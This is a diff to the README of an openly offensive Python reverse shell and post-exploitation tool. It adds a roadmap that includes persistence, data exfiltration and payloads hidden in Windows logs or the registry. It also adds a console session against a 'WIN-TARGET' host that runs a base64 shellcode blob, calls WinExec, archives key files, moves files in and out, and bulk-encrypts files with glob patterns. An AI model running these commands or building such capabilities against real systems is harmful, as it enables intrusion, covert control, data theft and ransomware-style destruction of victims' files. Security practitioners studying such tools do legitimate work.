@@ -6,6 +6,8 @@
 
 This package implements an advanced reverse shell console (supports: TCP, UDP, IRC, HTTP and DNS).
 
+### Version 0.0.X - POC
+
  - Support basic reverse shell using netcat or other standard/basic reverse shell
  - Basic terminal features
  - Commands history
@@ -23,6 +25,44 @@ This package implements an advanced reverse shell console (supports: TCP, UDP, I
  - Auto-restart for TCP client
  - Very large TCP packet (greater than TCP Window) is working
  - Check if command exists (only with advanced reverse shell features)
+
+### Version 0.1.X - Dev
+
+ - Builtins command
+     - Update environment
+         - Current directory
+         - Files/Executables
+         - Encryption key
+         - Compression algorithm
+             - Gzip, Lzma, Bz2, Zlib
+         - Data encoding
+             - Bases: 16, 32, 64 85
+     - Upload and download file (optional compression)
+     - Download file from URL
+     - Code execution (for the python POC it's a python execution) (optional compression)
+     - Shellcode runner (optional compression)
+     - Single/Multiple file(s) encryption/decryption with parallelism (multi-processing) (multiple encryption support glob syntax)
+     - Archive files (useful to download mutliples files with only one command)
+     - Call DLL or shared object functions (for example to use Win32 API)
+ - Update encryption key with random value
+     - New encryption is based on the precedent encryption, without all of the precedents keys you can't decrypt data
+
+### Version 1.0.X - TODO
+
+ - Auto install (in memory and/or saved on the disk)
+     - From basic reverse shell
+     - From protocols
+         - WMI (impacket plugin ?)
+         - SMB (impacket plugin ?)
+ - Persistence
+ - Data exfiltration
+ - Saved hidden payloads (for examples in Windows logs or registry)
+ - Spawn TTY for Linux
+ - Download multiples files on another temp socket (for parallelism, useful to export lot of data)
+ - Waiting to execute command after receive it (using `Beep`, *socket timeout*, `Sleep`, *child process, async worker or thread end*, `print`)
+ - Thread instead of process
+
+### Examples
 
 You can read multiples POC for reverse shell client written in python in the *clients* directory.
 
@@ -77,6 +117,58 @@ with ReverseShellTcp(address=("127.0.0.1", 1337), ssl=True, cert="server.crt", k
 # To test this command use the "shellclienthttpsencrypt_advanced.py abcd" command. This is an advanced HTTPS encrypted (using RC4 with "abcd" key) reverse shell.
 ```
 
+### ReverseShell builtins commands
+
+```
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ call_library_function kernel32.dll WinExec "char *:calc.exe" "long:1"
+Return value: 33
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ archive_files test.zip *.md *.key
+Making archive...
+[*] 1 childs process are running...
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ download_url http://google.com test.html
+Done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ cd ..
+done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\Hardis\Dev\Offensive$ update_environment
+done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ upload_file shellcode.py shellcode2.py
+['shellcode.py', 'shellcode2.py']
+done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ download_file shellcode2.py
+done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ python3_exec print('qwerty')
+qwerty
+None
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ upload_file_compress shellcode.py shellcode2.py
+['shellcode.py', 'shellcode2.py']
+done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ download_file_compress shellcode2.py
+done
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ python3_exec_compress print('qwerty')
+qwerty
+None
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ shellcode SDHJSIHp3f///0iNBe////9Iu9MZW06IcMOdSDFYJ0gt+P///+L0L1HYqniYA53TGRofySCRzIVRapztOEjPs1HQHJA4SM/zUdA82DjMKplTFn9BOPJdfyU6Mopc49wS0FYPibEhcIFYCgYDIuMWkSUTT1j7QxXTGVsGDbC3+psYix4DONvZWFl7B4mgIMub5pIPA0RL1dLPFn9BOPJdf1iah4Uxwlzr+S6/xHOPudtcYp/9qJvZWFl/B4mgpdxYFRMKAzDf1NLJGsWM+IucA1gDD9AumseSQRoXySqLHj85Ghx3kJvcikMTxZqZlGIs5gYGMnHDndMZW06IOE4Q0hhbTsnK8ha8nqSbM5Det9lY4egdzV5iBlHYiqBMxeHZmaCu/XV42sBrNCSIKYIUCeaOLekcoLO2YT5OiHDDnQ==
+
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ shellcode_compress SDHJSIHp3f///0iNBe////9Iu9MZW06IcMOdSDFYJ0gt+P///+L0L1HYqniYA53TGRofySCRzIVRapztOEjPs1HQHJA4SM/zUdA82DjMKplTFn9BOPJdfyU6Mopc49wS0FYPibEhcIFYCgYDIuMWkSUTT1j7QxXTGVsGDbC3+psYix4DONvZWFl7B4mgIMub5pIPA0RL1dLPFn9BOPJdf1iah4Uxwlzr+S6/xHOPudtcYp/9qJvZWFl/B4mgpdxYFRMKAzDf1NLJGsWM+IucA1gDD9AumseSQRoXySqLHj85Ghx3kJvcikMTxZqZlGIs5gYGMnHDndMZW06IOE4Q0hhbTsnK8ha8nqSbM5Det9lY4egdzV5iBlHYiqBMxeHZmaCu/XV42sBrNCSIKYIUCeaOLekcoLO2YT5OiHDDnQ==
+
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ encrypt_file test.html
+[!] Invalid command detected for 'encrypt_files' command. Minimum 2 arguments are required.
+[*] USAGE: encrypt_files [key] [filename1] [filename2] ... [filenameX]
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ encrypt_file qwerty test.html
+Encryption is running...
+[*] 1 childs process are running...
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ decrypt_file qwerty test.html
+Decryption is running...
+[*] 1 childs process are running...
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ encrypt_files qwerty *.html *.zip
+Encryption is running...
+[*] 2 childs process are running...
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$ decrypt_files qwerty *.html *.zip
+Decryption is running...
+[*] 2 childs process are running...
+WIN-TARGET@USER-TARGET:C:\Users\USER-TARGET\Documents\ReverseShell$
+```
+
 ## Screenshots
 
 ![ReverseShell](https://mauricelambert.github.io/info/python/security/ReverseShell.png "ReverseShell")
@@ -91,6 +183,7 @@ You are welcome to contribute ! Beginner, intermediate and advanced developpers 
  - [Pypi](https://pypi.org/project/ReverseShell/)
  - [Documentation](https://mauricelambert.github.io/info/python/security/ReverseShell.html)
  - [Executable](https://mauricelambert.github.io/info/python/security/ReverseShell.pyz)
+ - [Windows Executable](https://mauricelambert.github.io/info/python/security/ReverseShell.exe)
 
 ## Help
 
